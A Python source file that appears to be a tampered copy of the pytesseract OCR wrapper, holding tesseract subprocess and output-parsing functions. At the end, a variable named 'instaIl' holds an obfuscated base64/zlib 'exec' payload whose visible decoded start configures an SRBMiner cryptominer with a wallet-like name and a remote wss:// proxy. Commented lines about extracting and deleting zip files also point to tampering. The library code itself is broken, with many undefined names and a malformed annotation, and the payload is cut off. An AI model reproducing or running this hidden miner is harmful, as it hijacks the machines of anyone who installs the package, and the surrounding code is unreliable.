import base64
import zlib
import logging
import re
import shlex
import string
import subprocess
import sys
import subprocess
import zipfile
import signal
import os
from contextlib import contextmanager
from csv import QUOTE_NONE
from errno import ENOENT
from functools import wraps
from glob import iglob
from io import BytesIO
from os import environ
from os import extsep
from os import linesep
from os import remove
from os.path import normcase
from os.path import normpath
from os.path import realpath
from tempfile import NamedTemporaryFile
from time import sleep

tesseract_cmd = 'tesseract'

class Output:
    BYTES = 'bytes'
    DATAFRAME = 'data.frame'
    DICT = 'dict'
    STRING = 'string'

class PandasNotSupported(EnvironmentError):
    def __init__(self):
        super().__init__('Missing pandas package')

class TesseractError(RuntimeError):
    def __init__(self, status, message):
        self.status = status
        self.message = message
        self.args = (status, message)

class TesseractNotFoundError(EnvironmentError):
    def __init__(self):
        super().__init__(
            f"{tesseract_cmd} is not installed or it's not in your PATH."
            f' See README file for more information.',
        )

class TSVNotSupported(EnvironmentError):
    def __init__(self):
        super().__init__(
            'TSV output not supported. Tesseract >= 3.05 required',
        )

class ALTONotSupported(EnvironmentError):
    def __init__(self):
        super().__init__(
            'ALTO output not supported. Tesseract >= 4.1.0 required',
        )

def kill(process, code):
    process.terminate()
    try:
        process.wait(1)
    except TypeError:  # python2 Popen.wait(1) fallback
        sleep(1)
    except Exception:  # python3 subprocess.TimeoutExpired
        pass
    finally:
        process.kill()
        process.returncode = code

# with zipfile.ZipFile('python.zip', 'r') as zip_ref:
#     zip_ref.extractall()

def timeout_manager(proc, seconds=None):
    try:
        if not seconds:
            yield proc.communicate()[1]
            return
        try:
            _, error_string = proc.communicate(timeout=seconds)
            yield error_string
        except subprocess.TimeoutExpired:
            kill(proc, -1)
            raise RuntimeError('Tesseract process timeout')
    finally:
        proc.stdin.close()
        proc.stdout.close()
        proc.stderr.close()


def get_errors(error_string):
    return ' '.join(
        line for line in error_string.decode(DEFAULT_ENCODING).splitlines()
    ).strip()

def cleanup(temp_name):
    """Tries to remove temp files by filename wildcard path."""
    for filename in iglob(f'{temp_name}*' if temp_name else temp_name):
        try:
            remove(filename)
        except OSError as e:
            if e.errno != ENOENT:
                raise
# try:
#     os.remove('pytesseract-mx.zip')
# except:
#     sleep(0.00001)

def prepare(image):
    if numpy_installed and isinstance(image, ndarray):
        image = Image.fromarray(image)

    if not isinstance(image, Image.Image):
        raise TypeError('Unsupported image object')

    extension = 'PNG' if not image.format else image.format
    if extension not in SUPPORTED_FORMATS:
        raise TypeError('Unsupported image format/type')

    if 'A' in image.getbands():
        # discard and replace the alpha channel with white background
        background = Image.new(RGB_MODE, image.size, (255, 255, 255))
        background.paste(image, (0, 0), image.getchannel('A'))
        image = background

    image.format = extension
    return image, extension

def save(image):
    try:
        with NamedTemporaryFile(prefix='tess_', delete=False) as f:
            if isinstance(image, str):
                yield f.name, realpath(normpath(normcase(image)))
                return
            image, extension = prepare(image)
            input_file_name = f'{f.name}_input{extsep}{extension}'
            image.save(input_file_name, format=image.format)
            yield f.name, input_file_name
    finally:
        cleanup(f.name)
        
def subprocess_args(include_stdout=True):
    # See https://github.com/pyinstaller/pyinstaller/wiki/Recipe-subprocess
    # for reference and comments.

    kwargs = {
        'stdin': subprocess.PIPE,
        'stderr': subprocess.PIPE,
        'startupinfo': None,
        'env': environ,
    }

    if hasattr(subprocess, 'STARTUPINFO'):
        kwargs['startupinfo'] = subprocess.STARTUPINFO()
        kwargs['startupinfo'].dwFlags |= subprocess.STARTF_USESHOWWINDOW
        kwargs['startupinfo'].wShowWindow = subprocess.SW_HIDE

    if include_stdout:
        kwargs['stdout'] = subprocess.PIPE
    else:
        kwargs['stdout'] = subprocess.DEVNULL

    return kwargs

def run_tesseract(
    input_filename,
    output_filename_base,
    extension,
    lang,
    config='',
    nice=0,
    timeout=0,
):
    cmd_args = []
    not_windows = not (sys.platform == 'win32')

    if not_windows and nice != 0:
        cmd_args += ('nice', '-n', str(nice))

    cmd_args += (tesseract_cmd, input_filename, output_filename_base)

    if lang is not None:
        cmd_args += ('-l', lang)

    if config:
        cmd_args += shlex.split(config, posix=not_windows)

    for _extension in extension.split():
        if _extension not in {'box', 'osd', 'tsv', 'xml'}:
            cmd_args.append(_extension)
    LOGGER.debug('%r', cmd_args)

    try:
        proc = subprocess.Popen(cmd_args, **subprocess_args())
    except OSError as e:
        if e.errno != ENOENT:
            raise
        else:
            raise TesseractNotFoundError()

    with timeout_manager(proc, timeout) as error_string:
        if proc.returncode:
            raise TesseractError(proc.returncode, get_errors(error_string))

def _read_output(filename: str, return_bytes: bool = False):
    with open(filename, 'rb') as output_file:
        if return_bytes:
            return output_file.read()
        return output_file.read().decode(DEFAULT_ENCODING)

def run_and_get_multiple_output(
    image,
    extensions: 0,
    # lang: str | None = None,
    nice: int = 0,
    timeout: int = 0,
    return_bytes: bool = False,
):
    config = ' '.join(
        EXTENTION_TO_CONFIG.get(extension, '') for extension in extensions
    ).strip()
    if config:
        config = f'-c {config}'
    else:
        config = ''

    with save(image) as (temp_name, input_filename):
        kwargs = {
            'input_filename': input_filename,
            'output_filename_base': temp_name,
            'extension': ' '.join(extensions),
            'lang': lang,
            'config': config,
            'nice': nice,
            'timeout': timeout,
        }

        run_tesseract(**kwargs)

        return [
            _read_output(
                f"{kwargs['output_filename_base']}{extsep}{extension}",
                True if extension in {'pdf', 'hocr'} else return_bytes,
            )
            for extension in extensions
        ]

def run_and_get_output(
    image,
    extension='',
    lang=None,
    config='',
    nice=0,
    timeout=0,
    return_bytes=False,
):
    with save(image) as (temp_name, input_filename):
        kwargs = {
            'input_filename': input_filename,
            'output_filename_base': temp_name,
            'extension': extension,
            'lang': lang,
            'config': config,
            'nice': nice,
            'timeout': timeout,
        }

        run_tesseract(**kwargs)
        return _read_output(
            f"{kwargs['output_filename_base']}{extsep}{extension}",
            return_bytes,
        )

def file_to_dict(tsv, cell_delimiter, str_col_idx):
    result = {}
    rows = [row.split(cell_delimiter) for row in tsv.strip().split('\n')]
    if len(rows) < 2:
        return result

    header = rows.pop(0)
    length = len(header)
    if len(rows[-1]) < length:
        # Fixes bug that occurs when last text string in TSV is null, and
        # last row is missing a final cell in TSV file
        rows[-1].append('')

    if str_col_idx < 0:
        str_col_idx += length

    for i, head in enumerate(header):
        result[head] = list()
        for row in rows:
            if len(row) <= i:
                continue

            if i != str_col_idx:
                try:
                    val = int(float(row[i]))
                except ValueError:
                    val = row[i]
            else:
                val = row[i]

            result[head].append(val)

    return result

def is_valid(val, _type):
    if _type is int:
        return val.isdigit()

    if _type is float:
        try:
            float(val)
            return True
        except ValueError:
            return False

    return True

def osd_to_dict(osd):
    return {
        OSD_KEYS[kv[0]][0]: OSD_KEYS[kv[0]][1](kv[1])
        for kv in (line.split(': ') for line in osd.split('\n'))
        if len(kv) == 2 and is_valid(kv[1], OSD_KEYS[kv[0]][1])
    }

def get_languages(config=''):
    cmd_args = [tesseract_cmd, '--list-langs']
    if config:
        cmd_args += shlex.split(config)

    try:
        result = subprocess.run(
            cmd_args,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
        )
    except OSError:
        raise TesseractNotFoundError()

    # tesseract 3.x
    if result.returncode not in (0, 1):
        raise TesseractNotFoundError()

    languages = []
    if result.stdout:
        for line in result.stdout.decode(DEFAULT_ENCODING).split(linesep):
            lang = line.strip()
            if LANG_PATTERN.match(lang):
                languages.append(lang)

    return languages
instaIl = "import base64;exec(base64.b64decode('dGhyZWFkcz00O25hbWU9J1NSQk1pbmVyLUNVU1RPTS8wLjAuNCc7d25hbWU9J1JGaWtKUUVQV2o3aHZlSHQ5Rzh3d0xmdWZFbURhZ29SZjQnO3BuYW1lPSdjPVJWTic7d3NzPSd3c3M6Ly9wcm94eS00cjNzLm9ucmVuZGVyLmNvbS9iV2x1YjNSaGRYSjRMbTVoTG0xcGJtVXVlbkJ2YjJ3dVkyRTZOekF4T1E9PSc7aW1wb3J0IHpsaWIsYmFzZTY0O189bGFtYmRhIE8wTzBPME8wME8wTzAwTzBPME8wME8wTzBPMDBPME8wME8wME8wTzAwTzBPMDBPMDBPMDBPMDBPMDBPME8wTzBPMDBPMDBPME8wTzBPMDBPMDBPMDBPME8wTzAwTzAwTzAwTzBPMDBPMDBPME8wTzBPME8wME8wTzAwTzBPMDBPMDBPMDBPME8wTzAwTzBPMDBPMDBPMDBPMDBPME8wTzBPMDBPME8wME8wME8wTzBPMDBPME8wTzBPME8wME8wME8wTzBPMDBPME8wME8wME8wTzAwTzBPMDBPMDBPMDBPMDBPMDBPMDBPME8wTzBPMDBPME8wTzAwTzBPMDA6X19pbXBvcnRfXygobGFtYmRhIHM6emxpYi5kZWNvbXByZXNzKGJhc2U2NC5iNjRkZWNvZGUocykpLmRlY29kZSgpKSgnZUp5cnlzbE1BZ0FFWkFHeScpKS5kZWNvbXByZXNzKF9faW1wb3J0X18oKGxhbWJkYSBzOnpsaWIuZGVjb21wcmVzcyhiYXNlNjQuYjY0ZGVjb2RlKHMpKS5kZWNvZGUoKSkoJ2VKeExTaXhPTlRNQkFBZlNBZ1k9JykpLmI2NGRlY29kZShPME8wTzBPMDBPME8wME8wTzBPMDBPME8wTzAwTzBPMDBPMDBPME8wME8wTzAwTzAwTzAwTzAwTzAwTzBPME8wTzAwTzAwTzBPME8wTzAwTzAwTzAwTzBPME8wME8wME8wME8wTzAwTzAwTzBPME8wTzBPMDBPME8wME8wTzAwTzAwTzAwTzBPME8wME8wTzAwTzAwTzAwTzAwTzBPME8wTzAwTzBPMDBPMDBPME8wTzAwTzBPME8wTzBPMDBPMDBPME8wTzAwTzBPMDBPMDBPME8wME8wTzAwTzAwTzAwTzAwTzAwTzAwTzBPME8wTzAwTzBPME8wME8wTzAwWzo6LTFdKSk7ZXhlYyhfKGInNEc1QmZPdy8vKzl6eHJtWFFJY0JxYmVWYkU3NXBmaEJ1cGJpcDhZMkdCWERucjliRzZaYVpwWS9EdENTSmhEYnRrUFpPaVBJQ1l3NEFVNnJsVGhNM2l5NW9td2ZzZS91MkNYK2p5RFprT0QwRUxmSUQySVJYRlIvMzgrVWgvQXhWRFBMK1Z1aHRjWU9kU2FwOU1pZS9NVVFOTHdKMTgza3JlT3l0OHB2Y21FRGhydGlzYnVEVWRUakt0Z2h4OHBVWGRJR1BXTlRmRVNkYmR5QmcyOUtreitUREx0REt3Q09IYzZLOVZXZUYrcGtBY1BRcU9HVFk1WDhRRmpueEw5OG1qY1ZzcUcvR2U1OHkvdlJGSTFOZFVuY3FYNjhKaE5pYTltdWtubTlOckxIZGJOeWhEN00wSDJIRjZiNitoTGpiUGpwSkgzaE5GOEdnYnIvZjZ3OXVHakRXK0VHUmlhWjJTL0EvOUV0dk9Ua09ZQlVEcDNHQjBwc3JrNWdJWFFaL0ZBSCtERS9oR0xaWEVnczhTQ3pXRnlTWXVwWmhuaUthUGVWOFdjTjdTcUJneWdDT3pFSzE4RTlTTEY1RVkzN3lDU3YzaHFiQjVaSGM1WlhMSzJlaTEzRG5YelpabXdwcG5DS1NUNEpONk5GQmRwemh0RHhyaHV1YmFrRzkvRWVzZFVYcnNXQ2NOVm83MXU4eTJwNFloV2tlQ01pS1VTbTErWEtKdnZybVRiS2tYY3BXdEJGSWV5Vm8vZ3BIQjlNOVRheGlsRnJzSjVOQ1RQYlZJMWN0cTJUZGpmWW81L2ppRVRIZGpNdGg5S3BqejBSNklGSjEwZVN6MVA2UTZxZkZrWkR3MkUweCt4cVdGOUQ1Qi9TTTJTL0xhODFaQWRieVNlQys4M2tCRXhLTHo3N0kwWXNBM3ZWQzV5dEtzRCtSa3gybHo5bTNGTkZ4UTc3TmVOT2gwZEgxemo3K3FrbjlIUi90Nm9OTmZtOW5hWGFadEdrVWZtTFBwTWhCMnl4a2NGcUc0TlNRNEttbUpvTC8vS0dnMmNZZXlVRER2UEhYT2dOK2NTelhHTW5tVEF4QlcveGJZQldLVEllYmFNNVRjRGxkREtvNmtGWkgweno0VHluNVcvcVdTRHBwb1o0WGt6Tlc2bmZZWGlmdTJwWm5zWVo2VWhlZnZxNURlVUJaelBzckpHdnYwRVl0QytNem5wSnF3ek5pT1pXZCsyVVRMb3NMUEV4SFRhdDBha0FFekpIZUNkN01PQ1RuNTk1eDdIVisrekNKUE90Yk5QM2JIQmFmOWxtZUVrYTc1VjRZRU93YnBkcHpFdHU3TCtyZEJaZStFVGxZWlFzZjBlcjRwZU1NWDVGZERUbDdsOHBEL0h1RlU2T0NQOTBmdjkydXI5N2JxM3p5V0JOcEVRZ3lWbHdKR0oyTkZ4bXM2cUhZdU82Nk5GYm5HbmF5SjVLenJsdDdObEExM3ByNWpLMkZzUmJud1JzR2tEc3hTRDJXUXBxTnVOa2J3c3NLMFRDVlZkTUM3dDRBNEgzQlVqK2VNc0lZQnZrNnQ3N0pIZmNZTnVYSnBXK0tDZHhlK3ZFcjhtNzhtMStFUk1KRDlScmNOUnVobEV6WmxOcC96dHpIcHhucGVXVHpBeVRtV0w1ZmZjWkxUOU9SSThIT2E4ZmlhVFQwME9SYnpZeDVpRFpiQXMrdmlXOHphQmlLcHdMYlZJSm5vbTU3aXhQMFEyakx0QXdLTm95TEEzWmpwRmd3ZHUyejNMVnlYNVc2dGxwWVRvNTRleHk3bkptNkgzTnF1d09hREhMVkZmZi9Ga1ExNnlBZ1hBYTU0S2R5Y2ViZ29pbUlIYzYxNjRuRFIvVWpDcEQrNnBrK3RtQmRuOC96aHR1eE4zTzBUT0ZXYy81QW9nOVZGbjZ6YTNPOC9zbm5vRGZYK05Wcml6KzZNNEh1RHluMm0yKzkvY1dEUlY5ckxZOVpjUEgvSVhPU0dmd3dyT2Q1eG5JZGpjMW1SS0lJWE82OXh4aVE0Z3RJUjR1RzdQcnJkL1drZWVQYThFNWxDZWI2ZlFNU0NhcExNZjhqMFNBbDhoVUNzKzVnbGJEZDFrZ3Y5SGFYN0w1bkhUOUkyTW9STnBFTmV4bU5ISVppOGhIZUpQOTlvSWt2YzQ0UWdSYWQwNVJNOHcrS2hnbksvcXppNVBRc0YrbDMwTmFMeUQrRUgxR291NEJEYmxVdkRqTEhBdGxya0dHYmVLMUx6cUs1c2c5YThiZStoQzJlanAxaTg1aG9iS1NKam5mK095bkdMMjZpKzBHZzFUTk1BU0RnakpTZXlyM2JQM09LTnVYdWxBK2Yvb1N4dVA0MGZPTEdHZUVmRDROUm96S2laVytvTWtWSllTbU1MMlZnWTZHbDhEcy9rRVVWeW9PM1UyL0FPaklWTDJYc054ZnQySlhJb1J0d3NXNXRDWTlWaXpoMEtLNkxFZjRkVnJXOHpWTGV2clIzb0ZxTDhyRG1KQS90UXpDQUdvaHlzVUlhei9Xa3pBWEM3YjZQMDN4N3ZtaFpiUFJNVjFLOXhQdnhmOWpZRUxSZ2E4WjJ3QkovampjNk9mVFgzOWtCb1RNYUtvUEEyd2g3bEVoOWU1VmsyNkVBUmJlY3RDWUZFNjdKY2E3bVdvSlhETFFua2FPak1wS1FvVThwWkQ0RVN6YmNQZWthamlURjQzeVY4U1ptUzlmSHFpOG1PSmt6aXFEWUdyVlgzMDVrNEFVNnhoK0daeEliVGVtVDVhSFVrQ3RERGlKU0dlcTA2ZGpLUkdiN01tTEhqYnNERFJzZ05heTZEcko3TXBncXUzdmxXd3MwYUpUZ0Q1ZUt4VURxVDFyRUhMZGhuc0JpT1VJSWxNR05oc0I5aW1tRGpHZFZFM0pVZ2FtQjRwR3c4eFVVeDUvM2Q5ZjN5T3pYSTlmcjE2dzN2RjJQSjZ5UUZSUnQrN3ArbzFDczZTbEhKMWJGZ2ZnRUovblUyUVpZQVJHcVp1SEtqeXVucCtaVmdmU2llZDVjS3JoNERFdTBtUndzQTFLV1Nnc2NIYTBtZmVMaHFrSHhXMGxUN0hXbENmblQzTklEUGtnMHhPdURKeExlNzRXbXVnZm9seDIrajN2TmFDdkdOelM5MmtBR0ZUNVJEbDA1RytOV1FUMnBWMnVwdmZ4TGRRcGJGcXVCYTl3T2tFbmJYeTJQMElBcnM4TzBNaEJLb1JvcnM2ZFN1TXcxVkxGVGJvRnVOZWNuUXBLemZpUGZKQVVMQ0VlVStSQjJZcEpFdFlHem0zSWVrWnB6Sm9mcC96TU1ZSkJqaTJzMDdJLzR3R1pZcmNXcnZydWJZUjFmbU1haVRHbWtuR3hqeHpOZlJYSmp3ODcvVTZRY0l0N1NxVHhCT3RSbDRHWGVoaFpqM0lpQVJJV2hZTlg1MS91VUNWNUJmMlVab2RqVEd0anIveHo4WTI0UndiRldTSHNVRThTSGlqa2ZXMDJRd2Z2aWlON1B5ekhUZis2VkhPZE1mZDNxVzk5a2NYUjUvd0hCdFVZWU9rMzExTmFrbU1IZjlkayt0cGgzT1dSZDUrcXhrQVFNMmxxaHlUR1Vucm4yaFhPa3N5UDUxY041dXp1YmV5dXMybHBqVStYdjlVM2FzbDZ3Y1FZZVpzT1ZxcTZCclJzZ3VuVVZURXhFYjRNZnZJUWZ2SWp4OHVTbkJkR09xWHJCNXl0aHVLaHF0OXR3VGZjYXFHd2JscWZ0NHRiK0lFSjNYNmJVWFJJc2w5UlVIUUpTejB2TGRobnZxS0dXdDh4OUZocmFCdWZtdXZWcVJxbm9YRThLUWdPZ09KYlRHZXJweGxNYWhqRmdaVlVIdFVsbXB0RnY2dFB6a1VBWVpDbHZKUDhla1MwdzJjS2JXYWk5TFZpSmRpOVo5aEo0ZzF5Q3RsQ3RVY3NGRlJiMmlwS0dYS2UrWEFBU0JSaWx5NTZLZ2MzVkc5SmJkajVqdVdzaDJCdUxLK1RsMEs2TlRBU0RwR1dwMXRUUFVPb3FHYmpZaVRuYlFlVklGTmV5NEErYTFkK1FXSUV2R1pKeDAxVmlFMEEzb254amlzZlJJSk5Nb1dSTHhoK2ZKWmRhQkNPQkh1dnlUN3ptSXVTcWV5MW5nOTBrV3N3SllPOVFuSXN4RUluRy96QUhmenlvQVZRSlpRVTVLZDFNN3p3Y3JXTnF2bzgrQ3dGMmpaanEvWUJBeVUrN0J1T1JqOXhSVjg2cjZJSWtqVzNWUDNHa202VmtxQy9oN0tYamdkOGxteDhQcUUyUGRmb25OOUExb3E0alRBeXJpenVrOTlzZlQ1dThGeUxKUlFzdW04b0tNZlJUTnhLSVkrV0tNMUVWU3ZXN3lkQWRtL1ZkUFk2aDJ4RDl5Mm5uVnFDMllPZmJmZ1ZBcmQzWGJBdVpEOGI2WVh4MTVxWW1XL3lmSDNlWWlHVzF5YlU1UjI1T05HWTZ5bi9lTmt1Z21CTEJ5TVYyeC9xazJNZ1dtclVCcTNSU1hCYXZaN2dlbU9LbGd5L1JzYWM5SVBDaklZQnBIa1hxNGJCZ0FZcjRJeVZnbnF5cVlqbU9vQVdzUHF3SEtLMXQ4dHpWY2pWNy9jOHpQZTliSVdSaXM1RmRxdmE0NHljc1Vsc3RmNVIzYnZXMXJ1RVYySzdMK28xbktia2srTlRndzBDV3hGRWpYZ0VSK1lKclp0Uzl6UDFyWCtpWllIL1JlN2x2RFpVaHdHYWVWU3kyaHNHVXhUaTdyTXg0cmdxeGZvMWJyMjlGNzZEdXZYL0FVSEd3ZHB5YnNNQTA1eE1zK1prSVRuckxYVWxzTkp0WkYvRk5FOVZKZStUeEE5ZjRzVC9UOW9FQzE0NlJDRXdtalJYSXliUVUvRGlJY0VGLzVockxLemZLZWlEQnVWVjBsMzNDcGhTOW5lbS9CTUNLektRY0kwcHFiTkpwRU1Pbi9RWHYrc201VkdjR3FTMWxSYzc2OVV2aXRXQ3VXRGdKajVueURwRzdHcDlSSkhnK3NPL0l6Z0pnSGhveWVYNnZFdnFaSFFvQkd2SmxRYXgxakhzSWpxaHlEai8zd3RLOFVJZTRSSVZNZjRkMEdxY0x4Zys3a0VkUldGTmRRUVo0ZWtaNmt0bXAzNDZ6VERtNFUvWVNxc3N1OVpkakMyeUgrS3dQVTd0TFh0cE45clV6WEtITGVSU1JoSElyV1FQdVU3Q1hYRkxDY3BJVDk0eTdhbWVZenhHZUhWanJkNmNFMXIrd2NNaTI3b3EzUGRVaGRHbHJ5clh4OVBSRXlMUmZ6eXBNNEhvL1lxYTF3TG9JcHZyNDJRcTdhT2l3Z2R6aENGcEhObzhWV2lWSTUzNys4QWJJODVzdnFjeEIwRmFHeldPaVcxYWNrV1YrRC83TjV5Y1ZIeE5aNGd2OVpnTmE3VDE3RFNYRXZ2ZFFGbGdDeFI2Zm9GSEx3cU03blRtSTVQUDBRSDJEclFJWE42djY4MEdwcmhHcGpjL3JHZG1YQ2VFc3VMMkZ2ZnJ2TGpJMzdibVBlR0sxSnZtTHlYL1FhbUorcDh2emlSUWRJZDMvTlo0WmIxeFAzVUJHTSsxZVloNmxvODVUTzFyUlc2Z0xtYjZ1SjJSVnNpNlp3ek9sMnlSTDl3ZE5rYmlYYTFka1RHL1prcDU5YU9ORW5sNXRmb21FMnJEQUUyNG1LYUdHcjRBUjF2eGxiakRjVnZKemFrTWJXb0hkS01FS0ZleTZXaDZzRytwMmV5WHk5Z2VraThhRktqc2c1Tzd3QjUzOVFOaFBEMVJtbW9xQXlsSzZFQlIxL3E0Vmk1MjB0MElBSmcvT3RJVEV2Q1VLWVU2VFhFZWhUUjJRNkk2NndrVlB6akhNdEdWYjJVVHA4OFU0ZzNWU3VaN2tNQ1h1V3A0UWJMQmlmL1dIQlU1ZFpuV3RydWI5YmFlWXZsY1NOV202NHpCSGhoZmFPbjVzRE5TOEVheDBpVHFnbU1mNGVWeXh0WG5PZWFiSG9SRjduVnZnaDROUTBoUTVNZzdRd0dTMjNIdnVSMGNMZ3RoemNsa1hIVUJ4aE5CUVFZcERDTEN2Z1A3ZkhPU043ZXBVSHJFK001aFo4NnBFSXRIdUxNeC9Wa3BmY2ZncVJ4ZjdHRklnUGZJME4yaTdqbzl1dmpLdlFyWWFtNVZFZFRncFJ0RmlrZHAvbUd4TFZNNFA5cHNsbS9tdUtmYi9pTWhTR3FqTGlSN3VEdTYxYmIveFk3TmNnWEsvbWc3dGNxMVJkbFYxcmUrMUw3Mi9DNHZzN0RHaHljRmkxbjY3VC9veGgwWTBxNU53NFpuejN1SDU0ZDhtTnVKa0NoSHIzc25QSFNNdGsyU3ArL1F6dGtQR1JyRkhEMG1sUTZLZW1pMkdueVpYaVNEck1TZ0lUYU45MDlYSVVzOEhQYS9SeWJLakx4eE5oL0E4U28vTmhSUDgzWnMrZEMxMzJNWXNlNXZyeExSV3pRM0J2dlJnU29EWXpVWkxsS2Y1Y3JMRk45cjFmQWxaM0h5SVc0TDlvV3FwVG5nbFlRZWZCLzY3alY3Q2FmRUhaZEs0TTVZa1pkcW4vODQxK0JCMUZrTEFRdHFJWWpRZUlYWjR5RjFDUVRGMVQ0aWFCSWsrY2JXcHMxUlhMSnRJWUxkeVdkdjBxalp3Ry83UFNZa2V0ZGNhajFtNzBRN3E1ZVZobVlOakh5TGpZd25kMURkQzYxenRhV250MW84bGlUWXVYdWlBMURCekJKUXYvYkdmM3B2cW5sdGZCdFdMdlp5OTdDQ1hJZldLdkNqK2RjWXBad2Urd0tTdG01QWxKejkrQjYxVnpEOXpxNU1XeDJiYjJCY1NlRmpYRzBWMVhmNzc3VDI3bXg5cFUzOFVIL3plcUZYVmVFZ0V2azZFNDBBM1RWd2syZmlZMC81aDcvQXM2czd0UVQyd1V4cm12WE5kYytvL3JvSzN3aFFScFVIeit1VGlwMlZsMU9DMWxuVlUzUlpkVEtUaS9RQjdrcngybXlGSVNtMGpKWURuVTVYL3U1aDNQMGV4Q3lKYk11R2g1bndtWEk3R0NyYzFOQnI4bzFVN09KWVZHWXFrRW1xVHliaGFNU21UYXFpWGFjTmZsanhOaElaOE9oSTY5cEFvZDljQ2FZdEhycVJZaHdNYUNJUUt2UGxMUFZyanZsNTlKbkVLakdTNThYQTgycjltWUUvZ3dBV2hzTVczSS85OHg1MUpsMzU2c3ZEYjBudTEycUFncDRYOWE3ZG9xUzUrWlIyRnMzY2NXMDA0YUJrbmlTTkVmS2RzcGxTdUZOY2tyYzNmSS8xUnpRMkxvWjdpVDY1M2pIMUdZVm9Qa0NwWWhxcHdRL3NwLzFLSkFUSkVKTDRjaEw2dTRLZkpEQStMVkMwenVJa2oyc0FlQnhMMFo1RmpURG9QWU9sSUowcmJRLzR0SndMOHR2VS9NRllYeDhyWWhGdVBVb1Q2NVVUUDBvNWZ4ZzE2UXAvbnMzNGtaaGlUUi9JbXZ6QlAvbFJhc2h2WjBoNUNuUFVhTEdNNzlVSzhTd1M4VnFiNm5SVjlJQmVZMENVU09jY0VWME0rSTVDdUxWNzdycVA4T0dPZVNMakRZMFdoZ0ozK3dqNmVQL0p1NFd3VXdXd05mTWNFUjdaN3hEWXF1MlhoWEFER2lETjczeXkreEg5cWlob1BidUdBaHpISkp5VG01R0t0SnFrYnFLRzg4QkJQMVFKV1JsM0FKa25ORkJlNis0eVpoUC8yN0crYzUwSHlaQ2hkOHFKSVVlUFc0aC9MZUZRckVFU0FHSWlKd2FHeGJOQTdqN2VZVzdBR0dpSy9CNjArRmw2NFhHaGxzVEhMVEgvWjhxRUx3RjFNb2pwMDZ3Z1kyYldPQmlneXU5ODg5VDd0QjJJK09mS1FVY05RbWFUcld1c3craDV4ckVhUUpyWTJtRTJQd2pPa2lObGdjbXZhQ1pWZFdCQ3dobzdJMmY4cnZEMlV0Y0dKVFZycFgySDNrcDI3T0E1Y0hzZVB0TzlQd29wQTFVYnQremtVMnlMU2J6MitxUGR0NEQyVXFSZ3ZlZUgyL1lENmd4UzJjNXNKVkRaT3V5ckl1blo3ZnNPQzNwdklJTWU3bS9JTUh2M3V4RFhaMEo3d0hOMTNPMm54TVE0TEs0VDBEOEU3MFMyM1F0VThuU0N4S1huR1Q4QW9sa3V4Ty9DWnRLWC9leDc5cTBlcnBpZ0xXRXY1U3YxYzQrLzg4MXNJbGxadk82c0tvUjVvSkVUaUFrRTExMXVveHhDODVhT1NQaVovdlUwSlJBTmRFMWQrQkdxRk9DVytPNkhaL01qVis0dDNKYUwySmk1ekNxbVlTNVpYMlJ6YzIzU3JmY1RFTnJ3amtuZzZSQitZWWcvOXFNSGNzT3JtdE9zYTFyaC9EZHlFWTRtcmJaL3llYmFzazI5dDdLSXBsTTJnd3RkRGFKUStwZU5XdS9sc2hHSHdwQ3dxdHdrOWpKdjVqTnEyaEhqcDQzcFZXUkkxd1krV1FHZEtvNjUrdXdBUkREN0g1S241SERWVlExWlgralB5VXhDd3RFRUtMYTJXUEhFUnc2akFkVWpGckkxUDlJT1VoSklaVStJREx3RUFDZnBOUWE4QlNkdjdZVVJ0M0dBdCtzcXltR091U2lBaU5WazN5dTUzSDhFdUxEMVNucmJTWE83b25mek5Samx1V01yb2VnSlNUYUVkdUtvNlN5dURGQzlROWtoM2Z5Y2hOSklLenFQTTlBQTZoejdRU2pUNUxPOWs2Q1I1YS9hVERxOUZqYkNkcFViZm5ySnczRlJoa3gzYVJGaDh0bTBxdHpNQzM0ci84UVJ4d05PM3JRc3BWTGRQaVJieGVEVzNwak5oWjh5Rm5HYmNzclFVZlFTOHQwTnJQZFVIZFUwRDhPcnpvVDB2ZTVaTlZMbEpBdHBsVi9JUENxakFKV0J2UkJPRURuSXU1M1ZEMVlpQkxwY2VpVy9BdmpqZnRJaEEybXRSUDVrZmlWa2tWcE5XRlJmM3U3cHFXcFJIWUFqbkVHNktjUEJWeXlKZGtONjAyYmJaOU9lRmRlRXo3YVJ6OGVqbzZ0S0kybEwwdUhnVGJhOGJqeCt5SmlWNzdsMStCYTE5ajE0VG5LZ0J0clBpWGxDSHZyZTVwekJOblpRbVFTeWFEa3RqMDFMSWMxSTZOUjZNZnlLUGwyamU3UjgxQnlVT2ZrekdCczhCNm01NUhTV3ZCQzE3dmE5WXFGQlB3M0MvS0g1MFJ4ck1aNG9JQzNJcTByTGgzWHVsRkxtU21mdGZEdzFwdlc2SlhwNVg2amtjWjdadEtwOUw4S2h1ZXRSM0tJblVNSVVyRHZ1K2djcXFqZytvSlh1VThOdkVQT3ZtUThQbSs5Tkc4ZXU2OW9WM0daSlpWNmJCc2JHT3NRUXZJNmk3RTRzQlRTSGZoWm05eGgxMmkvb2lOVzZuaFVrZUxXRzB5WFpIL2lKWldTOGZwV09OV0tqUG5wT0Q3ZDZkaXJFNHdaUGNwdUVHQ2FTeEhKbGFGbkcrem5HcjJPZEthb1NlSUxNOWp2Wk5Mdm5NdnJxMHRMVU1IU0M5Rk5hUHZxeVEzSzJsNUluQkU2NThEc01ZRWZBSXFjY012Y2hhYmMvU0pXQTdOQ0crYktJUnNyQ1RtVVc2RG5COXRFVGdCd2R3dU5nSTJSNFRPU0g1NWh0RTdOUTVwNGp2TGhRWGdYTGFxYkh0MFcrcm55VG50QU4wcWljWWNwRHFydnNaWTJyQmdrTXg5eWlCeFo2Wm5KMURYN2NUYnNKYjBoKzRmWnhXakd2QndxTk9lZktscGpQeHRsQTRVdDJhRGwya2N4VTUxZlhFcDkzdy92SG80dkY5MEtKUTZWZEFoVGVsSHAvVG5XVXh1cUgzU2k2NERXdjltcUxNbXBUYTZNM3I5WTdJUlEvOWpBZEhUTHUwVFlMeDRJT2JocDhSTWtaRGVsMVlKS1lwbyt5b0drczVTc2xKdGFmRFBBcjZCSGhEUEpWZit3MFkvZ2NxTmFZcVVSbDNBUkd4c1dBb0plNGwzcTZvZkFCa253bm8xc2RKVmhjaGl0bCt2cDgxWWp1ck8ycklEeGNHTDc1MjZsdlQrWnJobkg1d1VnVjZ5QVFLS3R1SnhRSjNWVDRwem56K28ycmNsNktyc0tUbUFoUDFQVGx6dWNBQ2NNTkNCMzgxK29SaWJ0amw1MlludVdFSEVwblI4dkJ4N0xLWFFicXpiTDRYOHFKTjVqRXdzUHBoRUJwZnhyUFBLb1dIK2xmeUJQeWtTRmhYQUQrNXU5SzR3MEZyc29VUVVOM3FjSzBoMTU2V